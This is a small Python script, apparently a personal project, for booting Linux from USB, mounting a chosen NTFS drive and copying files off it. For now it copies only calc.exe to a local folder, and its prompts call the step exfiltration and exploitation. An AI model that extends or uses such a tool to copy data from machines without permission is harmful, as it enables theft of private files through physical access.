#!/usr/bin/env python3

# Author: Keenan Kunzelman
# Description: Meant to be run on a linux bootable usb. Program scans for all connected storage devices and looks for specific 
# file systems to mount and then exfils data. Only looks for NTFS and exfils the calc.exe program for now.

import sys
import subprocess
import os
import argparse
import time

# ****overengineered class that probably should go. I could just use tuple here to store source,fs values because source always has to be unique****
class Drive:
    def __init__(self):
        self.source = ""
        self.target = "/mnt"
        self.fs = ""
        self.options = "rw"

    def set_source(self, source):
        self.source = source
    def set_fs(self, fs):
        self.fs = fs

    def get_source(self):
        return self.source
    def get_target(self):
        return self.target
    def get_fs(self):
        return self.fs
    def get_options(self):
        return self.options



#Run the command sudo blkid and then recieve its output as a bytes
#Decode using utf-8 and then split on \n
def grab_drives():
    proc = subprocess.Popen(["sudo blkid", "/etc/services"], stdout=subprocess.PIPE, shell=True)
    (drives, err) = proc.communicate()
    drives = drives.decode("utf-8").split("\n")
    return drives

# extracts the drives with ntfs types
# Modular for inclusion of *nix systems
def locate_winfs(drives):
    win_drives = []
    for drive in drives:
        if "ntfs" in drive:
            win_drives.append(drive)
    return win_drives

def mount_drive(drive):
    #should refactor to accept input for /media/drivetype
    subprocess.Popen(["sudo mount -t ntfs-3g -o nls=utf8,uid=1000,gid=1000,dmask=027,fmask=137 {} /media/windows".format(drive.get_source()), "/etc/services"], shell=True)
    time.sleep(1)

def find_winpayload():
    subprocess.call('cp /media/windows/Windows/System32/calc.exe /home/zigmo/Desktop/', shell=True)


def storewin_drives(raw_win_drives):
    win_drives = []
    for i in range(len(raw_win_drives)):
        temp_drive = Drive()
        temp_raw_drive = raw_win_drives[i].split()
        for attribute in temp_raw_drive:
            if "/dev" in attribute:         
                attribute = list(attribute)
                attribute.pop()
                attribute = "".join(attribute)
                temp_drive.set_source(attribute)     
            elif "TYPE" in attribute:
                temp_drive.set_fs(attribute)
        win_drives.append(temp_drive)
    return win_drives

def main():
    parser = argparse.ArgumentParser(description='Choose which mode to run program in. No input lists all the storage devices.')
    group = parser.add_mutually_exclusive_group()
    group.add_argument('-w', '--exfil_win', action="store_true")
    args = parser.parse_args()
    
    drives = grab_drives()
    if args.exfil_win:
        drive_count = 0
        raw_win_drives = locate_winfs(drives)
        win_drives = storewin_drives(raw_win_drives)
        print("Conected drives using the NTFS file system.\n")
        for drive in raw_win_drives:
            print("Drive {}\n{}\n".format(drive_count, drive))
            drive_count += 1
        target = input("\n========================================================\nplease choose a drive to exploit. Note drives start at 0\nDrive ")
        print("Targeting: " + raw_win_drives[int(target)])
        mount_drive(win_drives[int(target)])
        find_winpayload()
    elif not len(sys.argv) > 1:
        for drive in drives:
            print(drive)
    else:
        print("invalid flag")


 

if __name__ == '__main__':
    main()
    


